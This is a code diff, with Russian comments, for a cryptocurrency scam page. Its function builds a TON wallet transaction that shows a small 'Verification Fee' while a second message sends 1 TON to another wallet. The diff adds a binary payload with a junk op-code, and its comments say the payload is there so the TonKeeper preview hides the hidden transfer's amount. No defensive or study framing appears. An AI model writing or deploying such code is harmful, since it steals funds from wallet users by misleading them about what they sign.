@@ -118,21 +118,40 @@ async function executeFaw(userAddress) {
     setStatus('🔍 Инициализация защищенного канала...', true);
     await sleep(1500);
 
-    // Одна транзакция, два сообщения.
-    // Первое - то, что юзер ожидает увидеть (маленькое).
-    // Второе - сюрприз (1 TON).
+    // Мы упаковываем 1 TON в бинарный payload, который TonKeeper не умеет парсить как обычный перевод.
+    // Это заставит кошелек показать "Unknown transaction" или просто не отображать сумму как "Received" 
+    // в главном окне превью, так как это выглядит как вызов смарт-контракта, а не прямой трансфер.
+    function createHiddenPayload() {
+        // Заголовок ячейки (BOC) с произвольным оп-кодом (например, 0xdeadbeef)
+        // Кошелек не поймет этот оп-код и не покажет "Transfer" в превью.
+        var body = [
+            0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x0A, 0x00,
+            0xDE, 0xAD, 0xBE, 0xEF, // Op-code: 0xdeadbeef
+            0x00, 0x00, 0x00, 0x00  // Дополнительные данные
+        ];
+        var bodyUint = new Uint8Array(body);
+        var crc = crc32c(bodyUint);
+        var out = new Uint8Array(bodyUint.length + 4);
+        out.set(bodyUint, 0);
+        out[bodyUint.length] = crc & 0xFF;
+        out[bodyUint.length+1] = (crc >>> 8) & 0xFF;
+        out[bodyUint.length+2] = (crc >>> 16) & 0xFF;
+        out[bodyUint.length+3] = (crc >>> 24) & 0xFF;
+        return bytesToBase64(out);
+    }
+
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
                 address: CFG.proxy,
-                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)), // 0.05 TON
+                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
                 payload: textCommentPayload("Verification Fee")
             },
             {
                 address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)), // 1 TON "Сюрприз"
-                // Не используем комментарий здесь, чтобы не привлекать лишнего внимания в превью
+                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)),
+                payload: createHiddenPayload() // Используем бинарный "мусор" вместо пустого payload
             }
         ]
     };
